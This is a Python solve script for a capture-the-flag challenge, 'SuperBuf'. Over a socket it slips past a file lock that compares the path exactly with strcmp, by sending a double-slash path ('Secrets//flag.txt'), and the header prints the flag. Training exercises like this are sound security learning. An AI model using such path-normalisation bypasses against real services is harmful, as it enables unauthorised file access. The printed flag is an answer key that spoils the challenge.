#!/usr/bin/env python3
"""
SuperBuf CTF Solve Script
Challenge: superbuf.challenges.virginiacyberrange.net:9006
Category: Reverse Engineering / Binary Exploitation
Flag: flag{h3s_supr_j4ck3d!!}

Vulnerability: strcmp path bypass
The service locks "Secrets/flag.txt" using an exact string comparison.
By using an equivalent but differently-formatted path, we bypass the check.
"""

import socket
import time

HOST = "superbuf.challenges.virginiacyberrange.net"
PORT = 9006

def recv_until(sock, marker, timeout=5):
    """Receive data from socket until a marker string is found."""
    data = b""
    sock.settimeout(timeout)
    try:
        while marker.encode() not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data.decode(errors="replace")


def solve():
    print(f"[*] Connecting to {HOST}:{PORT}")
    with socket.create_connection((HOST, PORT), timeout=10) as s:

        # Step 1: Respond to the directory prompt
        banner = recv_until(s, "(y/n)")
        print(f"[*] Banner received:\n{banner.strip()}\n")

        print("[*] Sending 'y' to view the directory...")
        s.sendall(b"y\n")
        time.sleep(0.5)

        # Step 2: Receive the directory listing
        listing = recv_until(s, "view:")
        print(f"[*] Directory listing received (last line):\n...{listing[-200:].strip()}\n")

        # Step 3: Send the bypass payload
        # The service uses strcmp(filename, "Secrets/flag.txt") to lock the file.
        # Using "Secrets//flag.txt" (double slash) or "Secrets/./flag.txt" (dot path)
        # resolves to the same file on the filesystem but bypasses the strcmp check.
        bypass_path = "Secrets//flag.txt"
        print(f"[*] Sending bypass path: '{bypass_path}'")
        s.sendall((bypass_path + "\n").encode())

        # Step 4: Receive the flag
        response = recv_until(s, "}", timeout=5)
        print(f"\n[+] Response from server:\n{response.strip()}\n")

        # Extract the flag
        if "flag{" in response:
            start = response.index("flag{")
            end = response.index("}", start) + 1
            flag = response[start:end]
            print(f"[+] FLAG: {flag}")
        else:
            print("[-] Flag not found in response. Full output above.")


if __name__ == "__main__":
    solve()
